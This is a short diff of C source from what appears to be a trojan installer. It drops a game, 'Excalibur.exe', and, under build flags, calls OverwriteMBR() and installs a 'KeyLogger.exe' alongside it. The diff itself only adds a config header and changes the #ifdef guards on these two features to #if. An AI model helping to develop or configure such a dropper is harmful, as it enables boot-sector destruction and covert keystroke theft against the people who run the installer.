@@ -10,6 +10,8 @@
 #include <stdint.h>
 #include <stdio.h>
 
+#include "config.h"
+
 #include "Binaries/ExcaliburBinary.h"
 #include "Installers.h"
 
@@ -85,7 +87,7 @@ static void InstallGame(const char* path)
 
 static void InstallEverything(char* path, HWND windowHandle)
 {
-#ifdef OVERWRITE_MBR
+#if OVERWRITE_MBR
     OverwriteMBR();
 #endif
 
@@ -102,7 +104,7 @@ static void InstallEverything(char* path, HWND windowHandle)
     strcat(gamePath, "\\Excalibur.exe");
     InstallGame(gamePath);
 
-#ifdef USE_KEYLOGGER
+#if USE_KEYLOGGER
     char loggerPath[MAX_PATH];
     strcpy(loggerPath, path);
     strcat(loggerPath, "\\KeyLogger.exe");
